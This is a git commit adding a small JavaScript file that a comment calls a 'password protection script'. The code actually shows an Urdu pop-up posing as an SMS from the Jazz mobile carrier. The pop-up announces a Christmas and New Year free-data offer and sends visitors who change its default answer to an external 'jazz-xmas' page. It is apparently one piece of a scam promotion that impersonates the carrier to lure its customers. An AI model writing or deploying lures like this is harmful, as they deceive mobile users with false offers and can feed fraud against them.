e98ca04838c89c7547e3fcf5468fb3cda680dc20
itidnewblog4 <ukpehaitid2@gmail.com>
2025-12-25 07:10:55 +0100

    Create jazz-xmasactive.js

---
+++ jazz-xmasactive.js
@@ -0,0 +1,10 @@
+  
+/* Password Protection Script by www.onlineofferz.xyz*/
+var password = 'مفت ڈیٹا کو چالو کریں۔'
+password = prompt(
+  'SMS: مبارک ہو! آپ کا جاز نمبر کرسمس اور نئے سال کی پیشکش وصول کرنے کا اہل ہے۔ اپنا نمبر درج کرنے کے لیے براہ کرم اوکے کو دبائیں۔.',
+  'مفت ڈیٹا کو چالو کریں۔'
+);
+if (password != 'مفت ڈیٹا کو چالو کریں۔') {
+  location.href = 'https://phlug.org/jazz-xmas.html';
+}
